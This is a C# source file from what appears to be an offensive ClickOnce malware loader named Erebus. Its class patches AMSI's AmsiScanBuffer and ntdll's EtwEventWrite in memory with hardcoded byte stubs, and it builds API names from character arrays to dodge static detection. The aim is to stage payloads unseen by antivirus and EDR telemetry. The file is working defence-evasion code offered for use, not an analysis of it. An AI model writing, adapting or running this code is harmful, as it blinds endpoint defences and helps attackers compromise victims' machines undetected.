using System;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Evasion
{
    /// <summary>
    /// AMSI and ETW runtime patching for the managed loader.
    ///
    /// AMSI context: the CLR invokes AmsiScanBuffer whenever an in-memory
    /// assembly is loaded via Assembly.Load(byte[]) and on a few other
    /// reflective paths. A CLR host that is about to stage a payload or
    /// run any interpreted script path wants AmsiScanBuffer to report
    /// AMSI_RESULT_CLEAN. We achieve this by overwriting the first bytes
    /// of the function with a stub that returns E_INVALIDARG, which the
    /// CLR's AMSI wrapper treats as "no verdict - allow".
    ///
    /// ETW context: EtwEventWrite is the user-mode entry point for the
    /// Microsoft-Windows-DotNETRuntime provider (JIT events, Assembly
    /// load events) and a handful of telemetry providers that EDR vendors
    /// subscribe to. Patching it to xor eax, eax; ret silences everything
    /// that goes through the user-mode ETW funnel without affecting the
    /// kernel-side ETW-TI pipeline (which can't be touched from user
    /// mode anyway).
    ///
    /// All sensitive string literals are built through DynamicApi.FromChars
    /// so the DLL and function names never appear in the assembly's
    /// #Strings heap.
    /// </summary>
    [SupportedOSPlatform("windows")]
    internal static class EvasionPatches
    {
        private static bool s_amsi_patched;
        private static bool s_etw_patched;

        public static void RunEvasionPatches()
        {
            try { PatchAmsi(); } catch { /* best effort */ }
            try { PatchEtw();  } catch { /* best effort */ }
        }

        // ============================================================
        // AMSI - AmsiScanBuffer -> return E_INVALIDARG
        // ============================================================
        private static void PatchAmsi()
        {
            if (s_amsi_patched) return;

            char[] amsiDll       = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
            char[] scanBufferFn  = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };

            IntPtr target = DynamicApi.Resolve(amsiDll, scanBufferFn);
            if (target == IntPtr.Zero) return;

            // x64: mov eax, 0x80070057 ; ret            (6 bytes)
            // x86: mov eax, 0x80070057 ; ret 0x18       (8 bytes)
            byte[] patch = Environment.Is64BitProcess
                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

            WritePatch(target, patch);
            s_amsi_patched = true;
            DebugLogger.WriteLine("[+] AMSI patched (AmsiScanBuffer -> E_INVALIDARG)");
        }

        // ============================================================
        // ETW - EtwEventWrite -> xor eax, eax ; ret (STATUS_SUCCESS)
        // ============================================================
        private static void PatchEtw()
        {
            if (s_etw_patched) return;

            char[] ntdllDll       = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
            char[] etwEventWriteFn = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e' };

            IntPtr target = DynamicApi.Resolve(ntdllDll, etwEventWriteFn);
            if (target == IntPtr.Zero) return;

            // xor eax, eax ; ret
            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
            WritePatch(target, patch);
            s_etw_patched = true;
            DebugLogger.WriteLine("[+] ETW patched (EtwEventWrite -> nop)");
        }

        // Flip target page to RWX, overwrite with patch bytes, restore
        // original protection. No hashing / indirect syscalls here -
        // managed code can't cleanly invoke direct syscalls, so we rely
        // on VirtualProtect. NtdllUnhook runs first and removes any
        // inline hook on VirtualProtect itself, so this call is as
        // clean as the managed runtime can make it.
        private static void WritePatch(IntPtr target, byte[] patch)
        {
            if (!DynamicApi.VirtualProtect(
                    target,
                    (UIntPtr)patch.Length,
                    DynamicApi.PAGE_EXECUTE_READWRITE,
                    out uint oldProtect))
            {
                return;
            }

            Marshal.Copy(patch, 0, target, patch.Length);

            DynamicApi.VirtualProtect(
                target,
                (UIntPtr)patch.Length,
                oldProtect,
                out _);
        }
    }
}
